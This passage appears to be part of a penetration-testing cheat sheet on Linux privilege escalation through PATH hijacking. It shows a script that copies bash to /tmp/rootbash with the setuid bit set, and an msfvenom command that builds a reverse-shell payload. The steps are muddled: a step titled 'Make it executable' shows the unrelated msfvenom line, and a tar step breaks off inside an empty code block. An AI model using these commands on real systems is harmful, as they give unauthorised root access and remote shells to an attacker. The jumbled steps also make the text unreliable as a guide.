## PATH Environment Variable

1. Create a file with the same name in a directory from the PATH variable with the code that allows /bin/bash to be run by the super user:
	
	```
	#!/bin/bash  
  
	cp /bin/bash /tmp/rootbash  
	chmod +xs /tmp/rootbash
	```
	
2. Make it executable

		msfvenom -p linux/x64/shell_reverse_tcp LHOST=<> LPORT=<> -f elf -o shell.elf

	2. Create these two files in the directory that tar runs:

	```
